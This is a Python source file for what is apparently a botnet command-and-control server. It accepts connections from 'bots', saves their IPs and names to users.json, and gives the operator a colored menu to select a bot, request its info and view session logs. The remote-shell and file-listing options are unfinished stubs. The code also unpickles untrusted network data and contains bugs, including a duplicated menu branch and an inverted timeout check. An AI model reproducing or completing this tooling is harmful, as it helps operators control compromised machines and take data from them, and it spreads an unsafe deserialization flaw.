import json
import os.path
import random
import socket, pickle#, security
import string
import threading, traceback
import time
from datetime import datetime
from colorama import init, Fore, Back, Style

init(autoreset=True)

addr = ('192.168.0.224', 5000)
#decryptor = security.get_decryptor()

standard_text = Fore.YELLOW
warning_text = Fore.RED + Style.BRIGHT
users = []
user_file = 'users.json'

def is_int(str):
    try:
        return int(str)
    except:
        return False

def get_choice(opts, title, subtitle=None):
    opt = None
    while not opt or not is_int(opt) or not 1 <= int(opt) <= len(opts):
        print(Back.CYAN + Fore.BLACK + ' ' + title + ' ')
        if subtitle:
            print(Fore.CYAN + Style.BRIGHT + subtitle)
        for opt in enumerate(opts):
            print(f'{Fore.BLUE}{opt[0] + 1}. {opt[1]}')
        opt = input(Fore.CYAN + '> ')
    return int(opt) - 1

def show(d):
    if isinstance(d, dict):
        for value in d:
            print(f'{Fore.GREEN + Style.BRIGHT}{value.capitalize()}: {Fore.MAGENTA}{d[value]}')
    else:
        print(f'{Fore.GREEN + Style.BRIGHT + d}')

def get_user(id):
    for user in users:
        if user.id == id:
            return user

class User():
    def __init__(self, conn=None, name=None, ip=None):
        if conn:
            self.conn = conn
            self.ip, self.port = conn[1][0], conn[1][1]
        else:
            self.ip = ip.split(':')[0]
        self.name = name
        self.hist = []
        self.msg = None
        self.alive = True if conn else False
        self.id = ''.join(random.choices(string.ascii_lowercase, k=8))
        if self.alive:
            self.hist.append({'from': 'server', 'msg': 'client connected', 'timestamp': datetime.now().strftime('%m-%d-%Y %I:%M:%S%p')})
            threading.Thread(target=self.keep_alive, args=()).start()

    def restart(self, conn, name):
        self.alive = True
        self.conn = conn
        self.name = name
        self.port = conn[1][1]
        self.hist.append({'from': 'server', 'msg': 'client reconnected', 'timestamp': datetime.now().strftime('%m-%d-%Y %I:%M:%S%p')})
        threading.Thread(target=self.keep_alive, args=()).start()

    def keep_alive(self):
        while self.alive:
            try:
                self.conn[0].send(pickle.dumps('keepalive'))
                time.sleep(3)
            except:
                self.hist.append({'from': 'server', 'msg': 'client disconnected', 'timestamp': datetime.now().strftime('%m-%d-%Y %I:%M:%S%p')})
                self.alive = False
                return

    def send(self, msg):
        self.conn[0].send(pickle.dumps(msg))
        self.hist.append({'from': 'server', 'msg': msg, 'timestamp': datetime.now().strftime('%m-%d-%Y %I:%M:%S%p')})

    def get_response(self):
        # get next msg from user
        self.start = time.time()
        print(standard_text + 'Waiting for client response...')
        self.old_num = len([m for m in self.hist if m['from'] == 'client'])
        while self.alive and self.old_num == len([m for m in self.hist if m['from'] == 'client']) and time.time() - self.start < 30:
            pass
        if not self.alive:
            return 'Clent disconnected'
        elif time.time() - self.start < 30:
            return 'Client response timed out'
        else:
            return [m for m in self.hist if m['from'] == 'client'][-1]['msg']

    def read(self):
        try:
            self.msg = self.conn[0].recv(4096)
            self.msg = clean(self.msg)
        except:
            self.hist.append({'from': 'server', 'msg': 'client disconnected', 'timestamp': datetime.now().strftime('%m-%d-%Y %I:%M:%S%p')})
            self.alive = False
            return -2
        if self.msg != -1:
            self.hist.append({'from': 'client', 'msg': self.msg, 'timestamp': datetime.now().strftime('%m-%d-%Y %I:%M:%S%p')})
            return self.msg

    def manage(self):
        while self.alive:
            self.m = self.read()
            if self.m == -2:
                return
            elif not self.m:
                self.send('Invalid input recieved')

def clean(msg):
    try:
        #msg = decryptor.decrypt(msg)
        return pickle.loads(msg)
    except ValueError:
        return -1
#todo bots saved only in memory, maybe save connection details to file?
def get_instructions(): #todo add file down/uploading from bot, get bot's file structure, add more options
    opt = get_choice(['Select a bot'], 'Main Menu')
    if opt == 0:
        if len(users) > 0:
            curr_users = [u.id for u in users]  # in case list of users changes before selection made
            opt = get_choice([f'{user.name} | {user.ip} | {Fore.GREEN + "ALIVE" if user.alive else Fore.RED + "DEAD"}' for user in users] + ['Main Menu'], 'Select a bot:', subtitle='Name | IP:port | Status')
            if opt != len(curr_users):
                user = get_user(curr_users[opt])
                bot_opts = [Back.RED + 'Enter Shell' if not user.alive else 'Enter Shell', Back.RED + 'Get list of files on bot' if not user.alive else 'Get list of files on bot', Back.RED + 'View bot info' if not user.alive else 'View bot info', 'View bot session logs', 'Main Menu']
                opt = get_choice(bot_opts, 'Choose an action:', subtitle=f'For: {user.name} | {user.ip} | {Fore.GREEN + "ALIVE" if user.alive else Fore.RED + "DEAD"}')
                if opt == 0:
                    if user.alive:
                        #TODO turn this section into shell
                        print('shellllllllllllllllllllllllllllll')
                    else:
                        print(warning_text + 'Dead bot, chose a live one')
                elif opt == 1:
                    if user.alive:
                        print('todo get bots files') #todo get bots files
                    else:
                        print(warning_text + 'Dead bot, chose a live one')
                elif opt == 2:
                    if user.alive:
                        user.send('getinfo')
                        response = user.get_response()
                        print(standard_text + f'Client info received from {user.name}:')
                        show(response)
                    else:
                        print(warning_text + 'Dead bot, chose a live one')
                elif opt == 2:
                    for msg in user.hist:
                        print(Fore.MAGENTA + f'{msg["timestamp"]} | {msg["from"]}: {msg["msg"]}')
        else:
            print(warning_text + 'No bots found')
        get_instructions()

def run():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(addr)
    server.listen()
    print(standard_text + f'Server running on {addr[0]}:{addr[1]}')
    print(standard_text + 'Wait a few seconds for any live bots to connect')

    threading.Thread(target=get_instructions, args=()).start()

    # create inactive user objs for saved ips
    if os.path.isfile(user_file):
        with open(user_file, 'r') as f:
            read_users = json.load(f)
        for u in read_users:
            users.append(User(ip=u, name=read_users[u]))

    while True:
        conn = server.accept()
        try:
            name = conn[0].recv(4096)
            name = clean(name)['name']
            user = None
            for u in users:
                if  u.ip == conn[1][0]:
                    user = get_user(u.id)
                    user.restart(conn, name)
                    break
            if not user:
                user = User(conn, name)
                users.append(user)
            if not os.path.isfile(user_file):
                with open(user_file, 'w') as f:
                    json.dump({}, f)
            with open(user_file, 'r') as f: #todo view bot session logs not working
                read_users = json.load(f)
            read_users[conn[1][0]] = name
            with open(user_file, 'w') as f:
                json.dump(read_users, f)
            threading.Thread(target=user.manage, args=()).start()
        except:
            traceback.print_exc()
            print(warning_text + f'Discarding connection because invalid name recieved from {conn[1][0]}:{conn[1][1]}')


if __name__ == '__main__':
    run()